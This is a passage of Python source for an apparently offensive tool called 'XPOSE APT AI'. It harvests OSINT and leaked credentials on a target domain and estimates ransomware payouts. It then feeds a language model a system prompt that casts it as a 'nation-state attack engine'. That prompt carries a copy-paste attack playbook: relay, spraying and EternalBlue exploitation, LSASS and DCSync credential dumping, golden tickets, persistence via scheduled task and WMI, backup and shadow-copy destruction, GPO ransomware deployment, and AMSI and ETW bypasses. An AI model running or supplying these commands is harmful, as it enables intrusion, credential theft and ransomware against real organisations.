        crtsh_str = ""
    combined_surface = attack_surface_str + " " + crtsh_str
    
    for svc in high_value_services:
        if svc in combined_surface:
            attack_surface_score += 0.5
            initial_access_prob += 5
            domain_admin_prob += 3
    
    # Apply industry multiplier
    ransomware_prob = int(ransomware_prob * industry_profile.get("ransomware_multiplier", 1.0))
    
    # Cap values at realistic maximums
    attack_surface_score = min(10, round(attack_surface_score, 1))
    initial_access_prob = min(95, initial_access_prob)
    domain_admin_prob = min(85, domain_admin_prob)
    exfil_prob = min(90, exfil_prob)
    ransomware_prob = min(90, ransomware_prob)
    full_takeover_prob = min(80, int((domain_admin_prob + ransomware_prob) / 2))
    
    # Breach value calculation
    avg_breach_cost = industry_profile.get("avg_breach_cost", 4.45)
    estimated_employees = max(100, emails_found * 8, subdomains_count * 5)
    size_multiplier = min(5.0, max(0.5, estimated_employees / 300))
    
    # Live targets (HTTP validated endpoints)
    http_live = osint_data.get("http_live", [])
    
    return {
        "target": target,
        "industry": industry_profile["name"],
        "attack_surface_score": attack_surface_score,
        "recommended_attack_path": get_recommended_attack_path(osint_data, initial_access_prob),
        "probabilities": {
            "initial_access": initial_access_prob,
            "domain_admin": domain_admin_prob,
            "data_exfiltration": exfil_prob,
            "ransomware_deployment": ransomware_prob,
            "full_takeover": full_takeover_prob
        },
        "breach_value": {
            "data_dark_web_min": round(max(5000, leaked_creds * 15, emails_found * 150) * 0.5, 2),
            "data_dark_web_max": round(max(5000, leaked_creds * 15, emails_found * 150) * 75, 2),
            "ransomware_demand_min": round(avg_breach_cost * size_multiplier * 0.15, 2),
            "ransomware_demand_max": round(avg_breach_cost * size_multiplier * 0.75, 2),
            "business_impact_min": round(avg_breach_cost * size_multiplier * 0.75, 2),
            "business_impact_max": round(avg_breach_cost * size_multiplier * 3.0, 2)
        },
        "osint_summary": {
            "subdomains_found": subdomains_count,
            "open_services": open_services,
            "leaked_credentials": leaked_creds,
            "emails_harvested": emails_found,
            "http_live": len(http_live),
            "technologies_detected": tech_count,
            "sources_queried": osint_data.get("metadata", {}).get("sources_queried", [])
        },
        "live_targets": http_live[:10],
        "industry_profile": {
            "high_value_data": industry_profile.get("high_value_data", []),
            "compliance_frameworks": industry_profile.get("compliance", []),
            "likely_attackers": industry_profile.get("likely_attacker_types", []),
            "critical_systems": industry_profile.get("critical_systems", [])
        }
    }

def get_recommended_attack_path(osint_data, initial_access_prob):
    """Determine recommended attack path based on OSINT"""
    attack_surface = " ".join(osint_data.get("technology", {}).get("attack_surface", [])[:50]).lower()
    leaked = osint_data.get("dehashed", {}).get("total", 0)
    
    if "citrix" in attack_surface or "vpn" in attack_surface:
        return {"path": "VPN/Citrix Exploitation -> Credential Harvesting -> Domain Compromise", "success_rate": min(85, initial_access_prob + 20)}
    elif leaked >= 100:
        return {"path": "Credential Stuffing -> Password Spraying -> Initial Access", "success_rate": min(80, initial_access_prob + 15)}
    elif "owa" in attack_surface or "exchange" in attack_surface:
        return {"path": "Exchange Exploitation -> Mailbox Access -> Lateral Movement", "success_rate": min(75, initial_access_prob + 10)}
    else:
        return {"path": "Reconnaissance -> Social Engineering -> Initial Access", "success_rate": initial_access_prob}

def format_osint_for_prompt(osint):
    sections = [f"## Target Domain: {osint.get('metadata', {}).get('domain', 'unknown')}", f"### Sources Queried: {', '.join(osint.get('metadata', {}).get('sources_queried', []))}"]
    
    # CRT.sh subdomains - include ALL of them
    crtsh = osint.get("crtsh", [])
    if crtsh and isinstance(crtsh, list):
        unique_subs = set()
        for entry in crtsh:
            if isinstance(entry, dict):
                names = entry.get("name_value", "").split("\n")
                for name in names:
                    if name.strip():
                        unique_subs.add(name.strip().lower())
        if unique_subs:
            sorted_subs = sorted(unique_subs)
            sections.append(f"### Certificate Transparency Subdomains ({len(sorted_subs)} found)\n" + "\n".join([f"- {s}" for s in sorted_subs]))
    
    # Shodan subdomains and services
    if osint.get("shodan", {}).get("domain"):
        data = osint["shodan"]["domain"]
        subs = data.get('subdomains', [])
        if subs:
            sections.append(f"### Shodan DNS Subdomains ({len(subs)} found)\n" + "\n".join([f"- {s}" for s in subs]))
    
    if osint.get("shodan", {}).get("hosts", {}).get("matches"):
        hosts = osint["shodan"]["hosts"]["matches"]
        host_lines = [f"- {m.get('ip_str')}:{m.get('port')} - {m.get('product', m.get('http', {}).get('server', 'unknown'))}" for m in hosts[:30]]
        sections.append(f"### Exposed Services ({len(hosts)} found)\n" + "\n".join(host_lines))
    
    # Breach data with details
    if osint.get("dehashed", {}).get("entries"):
        entries = osint['dehashed']['entries']
        total = osint['dehashed'].get('total', len(entries))
        unique_emails = list(set(e.get('email', '') for e in entries if e.get('email')))
        sections.append(f"### Leaked Credentials ({total} total breaches)\n**Compromised Emails:**\n" + "\n".join([f"- {e}" for e in unique_emails[:50]]))
        # Show some credential samples (redacted)
        cred_samples = []
        for e in entries[:10]:
            if e.get('password'):
                cred_samples.append(f"- {e.get('email', 'unknown')}: {e.get('password')[:3]}*** (from {e.get('database_name', 'unknown')})")
        if cred_samples:
            sections.append("**Sample Leaked Credentials:**\n" + "\n".join(cred_samples))
    
    # Hunter.io emails with full list
    if osint.get("hunter", {}).get("data"):
        data = osint["hunter"]["data"]
        emails = data.get('emails', [])
        sections.append(f"### Hunter.io Email Intelligence\n- Organization: {data.get('organization', 'Unknown')}\n- Email Pattern: {data.get('pattern', 'Unknown')}\n- Total Emails: {len(emails)}")
        if emails:
            email_lines = [f"- {e.get('value')} ({e.get('first_name', '')} {e.get('last_name', '')}) - {e.get('position', 'Unknown position')}" for e in emails[:30]]
            sections.append("**Discovered Email Addresses:**\n" + "\n".join(email_lines))
    
    # Technology stack
    tech = osint.get("technology", {})
    if tech.get("detected"):
        tech_lines = []
        for category, items in tech["detected"].items():
            if items:
                tech_lines.append(f"- **{category}**: {', '.join(items)}")
        if tech_lines:
            sections.append("### Detected Technology Stack\n" + "\n".join(tech_lines))
    
    # Attack surface
    if tech.get("attack_surface"):
        sections.append(f"### High-Value Attack Surface\n" + "\n".join([f"- {s}" for s in tech["attack_surface"][:20]]))
    
    return "\n\n".join(sections) if sections else "No OSINT data gathered yet. OSINT will be collected when a project is created with a target domain."

def format_impact_for_prompt(impact):
    if not impact: return "Impact analysis not available."
    p = impact.get("probabilities", {})
    b = impact.get("breach_value", {})
    return f"""
## IMPACT ANALYSIS
Target: {impact.get('target')} | Industry: {impact.get('industry')} | Attack Surface: {impact.get('attack_surface_score')}/10

### Success Probabilities
- Initial Access: {p.get('initial_access')}%
- Domain Admin: {p.get('domain_admin')}%
- Data Exfil: {p.get('data_exfiltration')}%
- Ransomware: {p.get('ransomware_deployment')}%

### Breach Value
- Dark Web Data: EUR{b.get('data_dark_web_min')}K - EUR{b.get('data_dark_web_max')}K
- Ransomware Demand: EUR{b.get('ransomware_demand_min')}M - EUR{b.get('ransomware_demand_max')}M
- Business Impact: EUR{b.get('business_impact_min')}M - EUR{b.get('business_impact_max')}M
"""

def load_knowledge():
    if not KNOWLEDGE_PATH.exists(): return "Knowledge base not available."
    knowledge_sections = []
    
    # Priority files get more content
    priority_files = [
        "apt-playbooks/08_XPOSE_Methode.md", 
        "methodology/Ultimate_RedTeam_Manual.md", 
        "operations/EDR_Evasion_Deep_Dive.md", 
        "operations/Windows_PostExploitation_Bible.md", 
        "playbooks/Exfiltration_Playbook.md"
    ]
    
    for pf in priority_files:
        fp = KNOWLEDGE_PATH / pf
        if fp.exists():
            try: knowledge_sections.append(f"\n### {fp.stem}\n{fp.read_text()[:15000]}")
            except: pass
    
    # Scan ALL subdirectories for .md files
    for subdir in KNOWLEDGE_PATH.iterdir():
        if subdir.is_dir():
            for f in subdir.glob("*.md"):
                if f.name not in [p.split("/")[-1] for p in priority_files]:
                    try: knowledge_sections.append(f"\n### {f.stem}\n{f.read_text()[:8000]}")
                    except: pass
    
    # Also scan root knowledge folder
    for f in KNOWLEDGE_PATH.glob("*.md"):
        try: knowledge_sections.append(f"\n### {f.stem}\n{f.read_text()[:8000]}")
        except: pass
    
    return "\n".join(knowledge_sections)[:100000]  # Increased limit

APT_SYSTEM_PROMPT = '''# XPOSE APT AI v8.0 - NATION-STATE ATTACK ENGINE
## "From Target Name to Full Domain Compromise - Every Command Verified"

---
## CRITICAL RULES - READ FIRST

### RULE 1: COMMAND ACCURACY (ZERO TOLERANCE FOR ERRORS)
- **ONLY USE REAL TOOLS** - Never invent tool names. If unsure, use established tools.
- **VERIFY SYNTAX** - Every command must be copy-paste executable
- **NO HARDCODED IPs** - Use variables: $LHOST, $RHOST, $DC_IP, $TARGET
- **TEST MENTALLY** - Before giving a command, verify it would actually work

**REAL TOOLS ONLY:**
```
# Impacket Suite (REAL):
psexec.py, smbexec.py, wmiexec.py, atexec.py, dcomexec.py
secretsdump.py, GetUserSPNs.py, GetNPUsers.py, getTGT.py, getST.py
ntlmrelayx.py, smbserver.py, rpcdump.py, samrdump.py

# Credential Tools (REAL):
mimikatz, pypykatz, nanodump, handlekatz, lsassy
Rubeus, Certify, Certipy, KrbRelay, KrbRelayUp

# Enumeration (REAL):
BloodHound, SharpHound, ADRecon, PingCastle, Snaffler
crackmapexec (cme), netexec (nxc), ldapsearch, rpcclient

# C2 Frameworks (REAL):
Cobalt Strike, Sliver, Havoc, Mythic, Brute Ratel
Metasploit, Empire, Covenant

# Web/Phishing (REAL):
Evilginx2, Gophish, CredSniper, Modlishka
Burp Suite, sqlmap, ffuf, feroxbuster, nuclei

# DO NOT USE: microphisher.py, entra_device_code_phish.py, or any made-up tool names
```

### RULE 2: VARIABLE STANDARDS
Always use these variable names so user knows what to replace:
```bash
$LHOST      = Attacker IP (your machine)
$LPORT      = Attacker listening port
$RHOST      = Remote target IP
$TARGET     = Target hostname or IP
$DOMAIN     = Domain name (e.g., ebema.local)
$DC_IP      = Domain Controller IP
$DC_HOST    = Domain Controller hostname
$USER       = Username
$PASS       = Password
$HASH       = NTLM hash (32 hex chars)
$TICKET     = Path to .kirbi or .ccache file
```

**Example (CORRECT):**
```bash
# Replace variables before running:
# $DC_IP = 172.25.1.69, $DOMAIN = ebema.local, $USER = svc_backup, $PASS = Winter2024!

GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerberoast.txt
```

### RULE 3: PREREQUISITE CHECKING
Before suggesting an attack, verify prerequisites are met:
```
SMB Relay -> Requires: SMB signing disabled (confirmed in report)
Kerberoasting -> Requires: Valid domain credentials (need to obtain first)
DCSync -> Requires: Replication rights or Domain Admin
Pass-the-Hash -> Requires: NTLM hash (need to dump first)
```

**ALWAYS STATE:** "Prerequisites: [X]. We have this because [finding from report]."

### RULE 4: SCRIPT GENERATION ON DEMAND
When a custom script is needed, WRITE IT FULLY. No placeholders inside scripts.

**Example - SMB Relay Target Validator:**
```python
#!/usr/bin/env python3
"""
SMB Signing Checker - Validates relay targets
Usage: python3 smb_signing_check.py targets.txt
"""
import subprocess
import sys

def check_smb_signing(ip):
    """Check if SMB signing is disabled (relay-able)"""
    try:
        result = subprocess.run(
            ['nxc', 'smb', ip, '--gen-relay-list', '/dev/stdout'],
            capture_output=True, text=True, timeout=10
        )
        return ip in result.stdout
    except:
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 smb_signing_check.py <targets.txt>")
        sys.exit(1)
    
    with open(sys.argv[1]) as f:
        targets = [line.strip() for line in f if line.strip()]
    
    print("[*] Checking SMB signing on", len(targets), "hosts...")
    relay_targets = []
    
    for ip in targets:
        if check_smb_signing(ip):
            print(f"[+] {{ip}} - SMB signing DISABLED - RELAY TARGET")
            relay_targets.append(ip)
        else:
            print(f"[-] {{ip}} - SMB signing enabled or host down")
    
    with open("relay_targets.txt", "w") as f:
        f.write("\\n".join(relay_targets))
    
    print(f"\\n[+] Found {{len(relay_targets)}} relay targets. Saved to relay_targets.txt")
```

---
## CONVERSATION STYLE

You are a senior APT operator (15+ years). Talk like a teammate, not a manual:

**GOOD:** "Nice, I see 24 hosts without SMB signing. Let set up the relay - here the exact setup..."
**BAD:** "SMB signing is a security feature that when disabled allows..."

**GOOD:** "Got it. Based on the null session on the DCs, let enumerate users first, then spray."
**BAD:** "There are several approaches we could consider..."

Be direct. Be specific. Reference actual findings. Move the operation forward.

---
## CURRENT OPERATION CONTEXT

**TARGET:** {target_info}
**OSINT DATA:** {osint_data}
**IMPACT ANALYSIS:** {impact_analysis}

---
## ATTACK METHODOLOGY

### PHASE 0: INFRASTRUCTURE SETUP
```bash
# Sliver C2 Setup (free, open-source alternative to Cobalt Strike)
curl https://sliver.sh/install | sudo bash
sliver-server  # Start server

# Generate implant
sliver > generate --mtls $LHOST:443 --os windows --arch amd64 --format exe --save implant.exe

# Start listener
sliver > mtls --lhost 0.0.0.0 --lport 443
```

### PHASE 1: INITIAL ACCESS

**Option A: SMB Relay (if signing disabled)**
```bash
# Terminal 1: Start Responder (capture mode only, no poisoning yet)
sudo responder -I eth0 -A

# Terminal 2: Start relay to dump SAM from targets
ntlmrelayx.py -tf relay_targets.txt -smb2support --dump-lsass

# Terminal 3: Trigger authentication (send phishing email, or wait for natural traffic)
# Alternative: LLMNR/NBT-NS poisoning
sudo responder -I eth0 -wrf
```

**Option B: Password Spray (if usernames known)**
```bash
# Spray against SMB
nxc smb $DC_IP -u users.txt -p 'Winter2024!' --continue-on-success

# Spray against OWA/O365 (external)
sprayhound --url https://mail.target.com/owa -u users.txt -p passwords.txt -t 5
```

**Option C: Exploit Known Vulns**
```bash
# EternalBlue (MS17-010) for Windows 2008 R2
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set LHOST $LHOST; set LPORT 443; run"

# ZeroLogon (CVE-2020-1472) - TEST ONLY, can break DC
python3 zerologon_tester.py $DC_HOST $DC_IP

# ProxyShell/ProxyLogon (Exchange)
python3 proxyshell.py -u https://mail.target.com -e user@target.com
```

### PHASE 2: CREDENTIAL HARVESTING

**From Memory (LSASS):**
```powershell
# Method 1: comsvcs.dll (LOLBin)
$p = Get-Process lsass; rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $p.Id C:\\Windows\\Temp\\d.dmp full

# Method 2: ProcDump (Sysinternals, often whitelisted)
procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp

# Method 3: nanodump (OPSEC safe, direct syscalls)
nanodump.exe --write C:\\Windows\\Temp\\nano.dmp
```

**Parse dump offline:**
```bash
pypykatz lsa minidump lsass.dmp
```

**From Registry (SAM/SYSTEM):**
```powershell
reg save HKLM\\SAM C:\\Windows\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM
reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY
```
```bash
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**From Domain (requires DA or replication rights):**
```bash
# DCSync - dump all hashes
secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP -just-dc

# Or specific user
secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP -just-dc-user krbtgt
```

### PHASE 3: KERBEROS ATTACKS

**Kerberoasting (requires any domain user):**
```bash
# Linux
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**AS-REP Roasting (no password needed):**
```bash
GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

**Golden Ticket (requires krbtgt hash):**
```bash
# Get domain SID
lookupsid.py $DOMAIN/$USER:$PASS@$DC_IP | grep "Domain SID"

# Create golden ticket
ticketer.py -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator

# Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass $DOMAIN/Administrator@$DC_HOST
```

### PHASE 4: LATERAL MOVEMENT

**Pass-the-Hash:**
```bash
# With Impacket
psexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET
wmiexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET
smbexec.py -hashes :$HASH $DOMAIN/$USER@$TARGET

# With CrackMapExec
nxc smb $TARGET -u $USER -H $HASH -x "whoami"
```

**Pass-the-Ticket:**
```bash
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
```

**WinRM (if enabled):**
```bash
evil-winrm -i $TARGET -u $USER -p $PASS
# Or with hash
evil-winrm -i $TARGET -u $USER -H $HASH
```

### PHASE 5: DOMAIN DOMINANCE

**BloodHound Collection:**
```bash
# From Linux
bloodhound-python -u $USER -p $PASS -d $DOMAIN -dc $DC_HOST -c All

# From Windows
SharpHound.exe -c All --zipfilename bh.zip
```

**Find Path to DA:**
```cypher
// In BloodHound
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {{name:"DOMAIN ADMINS@DOMAIN.LOCAL"}})) RETURN p
```

**ACL Abuse (if GenericAll/WriteDACL found):**
```bash
# Add user to group (GenericAll on group)
net rpc group addmem "Domain Admins" $USER -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" -S $DC_IP

# Grant DCSync rights (WriteDACL on domain)
dacledit.py -action write -rights DCSync -principal $USER -target-dn "DC=domain,DC=local" $DOMAIN/$ADMIN_USER:$ADMIN_PASS@$DC_IP
```

### PHASE 6: PERSISTENCE

**Scheduled Task:**
```powershell
schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\implant.exe" /sc onstart /ru SYSTEM
```

**WMI Event Subscription:**
```powershell
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    Name = "UpdateFilter"
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8"
}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "UpdateConsumer"
    CommandLineTemplate = "C:\\Windows\\Temp\\implant.exe"
}}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = $Filter
    Consumer = $Consumer
}}
```

**Golden Ticket Persistence:**
```bash
# With krbtgt hash, create tickets anytime
ticketer.py -nthash $KRBTGT_HASH -domain-sid $SID -domain $DOMAIN -duration 3650 Administrator
```

### PHASE 7: IMPACT (RANSOMWARE SIMULATION)

**Pre-Ransomware Checklist:**
```powershell
# 1. Delete shadow copies
vssadmin delete shadows /all /quiet
wmic shadowcopy delete /nointeractive

# 2. Disable recovery
bcdedit /set {{default}} recoveryenabled No
bcdedit /set {{default}} bootstatuspolicy ignoreallfailures

# 3. Stop backup services
Get-Service -DisplayName "*backup*" | Stop-Service -Force
Get-Service -DisplayName "*veeam*" | Stop-Service -Force

# 4. Disable Windows Defender (if not EDR)
Set-MpPreference -DisableRealtimeMonitoring $true
```

**GPO Ransomware Deployment (Domain-Wide):**
```powershell
# Create GPO
New-GPO -Name "Software Update" | New-GPLink -Target "DC=domain,DC=local"

# Add immediate scheduled task via GPO
# This runs ransomware on all domain computers at next gpupdate
```

**Ransomware Simulation Script (SAFE - logs only, no encryption):**
```python
#!/usr/bin/env python3
"""
Ransomware Simulation - SAFE VERSION
Only logs what WOULD be encrypted. No actual encryption.
For authorized penetration testing only.
"""
import os
import logging
from datetime import datetime

# Extensions that real ransomware targets
TARGET_EXTENSIONS = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.sql', '.mdb', '.accdb', '.sqlite',
    '.pst', '.ost', '.msg',
    '.dwg', '.dxf', '.vmdk', '.vhdx'
]

logging.basicConfig(
    filename=f'ransomware_simulation_{{datetime.now().strftime("%Y%m%d_%H%M%S")}}.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)

def simulate_ransomware(start_path):
    file_count = 0
    total_size = 0
    
    for root, dirs, files in os.walk(start_path):
        # Skip system directories
        dirs[:] = [d for d in dirs if d not in ['Windows', 'Program Files', 'Program Files (x86)']]
        
        for file in files:
            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                filepath = os.path.join(root, file)
                try:
                    size = os.path.getsize(filepath)
                    logging.info(f"WOULD ENCRYPT: {{filepath}} ({{size}} bytes)")
                    file_count += 1
                    total_size += size
                except:
                    pass
    
    logging.info(f"\\n=== SIMULATION COMPLETE ===")
    logging.info(f"Files that would be encrypted: {{file_count}}")
    logging.info(f"Total data that would be encrypted: {{total_size / (1024*1024*1024):.2f}} GB")
    print(f"[+] Simulation complete. {{file_count}} files ({{total_size/1024/1024/1024:.2f}} GB) would be encrypted.")
    print(f"[+] See log file for details.")

if __name__ == "__main__":
    import sys
    path = sys.argv[1] if len(sys.argv) > 1 else "C:\\\\Users"
    print(f"[*] Starting ransomware SIMULATION on {{path}}")
    print("[*] This is a SAFE simulation - no files will be modified")
    simulate_ransomware(path)
```

---
## OPSEC GUIDELINES

**Detection Risk Levels:**
```
LOW:    BloodHound, passive enumeration, file access
MEDIUM: Kerberoasting, AS-REP roasting, credential dumping
HIGH:   DCSync, Golden Ticket, lateral movement
CRITICAL: Ransomware deployment, GPO modification
```

**Evasion Techniques:**
```powershell
# AMSI Bypass (run before any PowerShell payload)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {{if ($b.Name -like "*iUtils") {{$c=$b}}}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {{if ($e.Name -like "*Context") {{$f=$e}}}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# ETW Bypass (disable event tracing)
$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$b=$a.GetField('etwProvider','NonPublic,Static');$c=New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());$b.SetValue($null,$c)
```

**Timing:**
- Active exploitation: Business hours (08:00-18:00) - blends with normal traffic
- Exfiltration: Night/weekend - less monitoring
- Persistence installation: During maintenance windows

---
## RESPONSE FORMAT

When analyzing uploaded reports/scans:

1. **QUICK SUMMARY** - What did we get? (2-3 sentences)
2. **PRIORITY TARGETS** - Top 3 things to attack first
3. **ATTACK CHAIN** - Step-by-step with EXACT commands
4. **SCRIPTS IF NEEDED** - Full Python/PowerShell, not snippets
5. **NEXT STEPS** - What we do after this succeeds

**NEVER:**
- Explain how to extract/parse the document (it is already done)
- Give commands with fake tool names
- Use hardcoded IPs without marking as variables
- Suggest attacks without checking prerequisites
- Give generic advice instead of specific commands

**ALWAYS:**
- Reference specific IPs/hosts from the report
- Verify command syntax is correct
- Chain attacks logically
- Include OPSEC considerations
- Write full scripts when custom tooling is needed
'''

PENTEST_SYSTEM_PROMPT = '''# XPOSE AI - STRUCTURED PENTEST MODE
## Framework: {framework_name}
## Current Test: {current_item}

**Description:** {item_description}

**Suggested Commands:**
{suggested_commands}

---

## YOUR DIRECTIVES

1. **Explain** what this test covers and why it matters
2. **Provide exact commands** with all options - copy-paste ready
3. **Show expected output** - what success/failure looks like
4. **Identify follow-up tests** based on results
5. **Document findings** in professional format

All commands must be in proper code blocks:

```bash
# Purpose of command
command --with --options
```

Guide the operator through systematic testing with professional depth.

## KNOWLEDGE BASE
{knowledge}
'''

# LLM Functions
def call_llm_streaming(messages, max_tokens=16000):
    if not LLM_API_KEY:
        raise Exception("LLM API key not configured. Add LLM_API_KEY to .env file")
    
    if LLM_PROVIDER == "deepseek":
        url, headers, model = "https://api.deepseek.com/chat/completions", {"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"}, LLM_MODEL or "deepseek-chat"
    elif LLM_PROVIDER == "groq":
        url, headers, model = "https://api.groq.com/openai/v1/chat/completions", {"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"}, LLM_MODEL or "llama-3.3-70b-versatile"
    else:
        url, headers, model = "https://api.openai.com/v1/chat/completions", {"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"}, LLM_MODEL or "gpt-4"
    
    try:
        response = requests.post(url, headers=headers, json={"model": model, "messages": messages, "max_tokens": max_tokens, "temperature": 0.8, "stream": True}, stream=True, timeout=180)
        if response.status_code == 401:
            raise Exception(f"401 Unauthorized: Invalid or expired {LLM_PROVIDER.upper()} API key")
        elif response.status_code == 402:
            raise Exception(f"402 Payment Required: {LLM_PROVIDER.upper()} account has no credits")
        elif response.status_code == 429:
            raise Exception(f"429 Rate Limited: Too many requests to {LLM_PROVIDER.upper()}")
        response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        raise Exception(f"{LLM_PROVIDER.upper()} API Error: {str(e)}")
    except requests.exceptions.ConnectionError:
        raise Exception(f"Connection failed to {LLM_PROVIDER.upper()} API")
    except requests.exceptions.Timeout:
        raise Exception(f"Request timeout to {LLM_PROVIDER.upper()} API")
    
    for line in response.iter_lines():
        if line:
            line = line.decode('utf-8')
            if line.startswith('data: ') and line[6:] != '[DONE]':
                try:
                    content = json.loads(line[6:]).get('choices', [{}])[0].get('delta', {}).get('content', '')
                    if content: yield content
                except: pass

def call_llm_sync(messages, max_tokens=16000):
    if not LLM_API_KEY:
        raise Exception("LLM API key not configured. Add LLM_API_KEY to .env file")
    
    if LLM_PROVIDER == "deepseek":
        url, headers, model = "https://api.deepseek.com/chat/completions", {"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"}, LLM_MODEL or "deepseek-chat"
    elif LLM_PROVIDER == "groq":
        url, headers, model = "https://api.groq.com/openai/v1/chat/completions", {"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"}, LLM_MODEL or "llama-3.3-70b-versatile"
    else:
        url, headers, model = "https://api.openai.com/v1/chat/completions", {"Authorization": f"Bearer {LLM_API_KEY}", "Content-Type": "application/json"}, LLM_MODEL or "gpt-4"
    
    try:
        response = requests.post(url, headers=headers, json={"model": model, "messages": messages, "max_tokens": max_tokens, "temperature": 0.8}, timeout=180)
        if response.status_code == 401:
            raise Exception(f"401 Unauthorized: Invalid or expired {LLM_PROVIDER.upper()} API key")
        elif response.status_code == 402:
            raise Exception(f"402 Payment Required: {LLM_PROVIDER.upper()} account has no credits")
        response.raise_for_status()
        return response.json()['choices'][0]['message']['content']
    except requests.exceptions.HTTPError as e:
        raise Exception(f"{LLM_PROVIDER.upper()} API Error: {str(e)}")
    except requests.exceptions.ConnectionError:
        raise Exception(f"Connection failed to {LLM_PROVIDER.upper()} API")
    except requests.exceptions.Timeout:
        raise Exception(f"Request timeout to {LLM_PROVIDER.upper()} API")

# API Routes
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"status": "operational", "version": "8.0", "llm_configured": bool(LLM_API_KEY), "llm_provider": LLM_PROVIDER, "shodan_configured": bool(SHODAN_API_KEY), "dehashed_configured": bool(DEHASHED_API_KEY), "hunter_configured": bool(HUNTER_API_KEY), "telegram_configured": bool(TELEGRAM_BOT_TOKEN)})

@app.route("/api/projects", methods=["GET"])
def list_projects():
    return jsonify(db_execute("SELECT * FROM projects ORDER BY updated_at DESC", fetchall=True))

@app.route("/api/projects", methods=["POST"])
def create_project():
    data = request.json
    project_id = str(uuid.uuid4())
    project_type = data.get("type", "apt")
    target = data.get("target", "")
    name = data.get("name", f"Project-{project_id[:8]}")
    impact_analysis = {}
    if project_type == "apt" and target:
        osint_data = gather_comprehensive_osint(target)
        industry = detect_industry(target, osint_data)
        impact_analysis = calculate_impact_analysis(target, osint_data, industry)
        db_execute("INSERT INTO osint_data (project_id, data_type, data) VALUES (?, ?, ?)", (project_id, "comprehensive", json.dumps(osint_data)))
    db_execute("INSERT INTO projects (id, name, type, target, framework, impact_analysis) VALUES (?, ?, ?, ?, ?, ?)", (project_id, name, project_type, target, data.get("framework", ""), json.dumps(impact_analysis)))
    return jsonify({"id": project_id, "name": name, "type": project_type, "target": target, "impact_analysis": impact_analysis})

@app.route("/api/projects/<project_id>", methods=["GET"])
def get_project(project_id):
    project = db_execute("SELECT * FROM projects WHERE id = ?", (project_id,), fetchone=True)
    if not project: return jsonify({"error": "Project not found"}), 404
    try: project["impact_analysis"] = json.loads(project.get("impact_analysis", "{}"))
    except: project["impact_analysis"] = {}
    return jsonify(project)

@app.route("/api/projects/<project_id>", methods=["DELETE"])
def delete_project(project_id):
    db_execute("DELETE FROM projects WHERE id = ?", (project_id,))
    return jsonify({"success": True})

@app.route("/api/projects/<project_id>/osint", methods=["GET"])
def get_project_osint(project_id):
    osint = db_execute("SELECT * FROM osint_data WHERE project_id = ? ORDER BY created_at DESC LIMIT 1", (project_id,), fetchone=True)
    if osint:
        try: osint["data"] = json.loads(osint.get("data", "{}"))
        except: pass
    return jsonify(osint or {})

@app.route("/api/projects/<project_id>/osint/refresh", methods=["POST"])
def refresh_osint(project_id):
    project = db_execute("SELECT * FROM projects WHERE id = ?", (project_id,), fetchone=True)
    if not project: return jsonify({"error": "Project not found"}), 404
    target = project.get("target", "")
    if not target: return jsonify({"error": "No target specified"}), 400
    osint_data = gather_comprehensive_osint(target)
    industry = detect_industry(target, osint_data)
    impact_analysis = calculate_impact_analysis(target, osint_data, industry)
    db_execute("INSERT INTO osint_data (project_id, data_type, data) VALUES (?, ?, ?)", (project_id, "comprehensive", json.dumps(osint_data)))
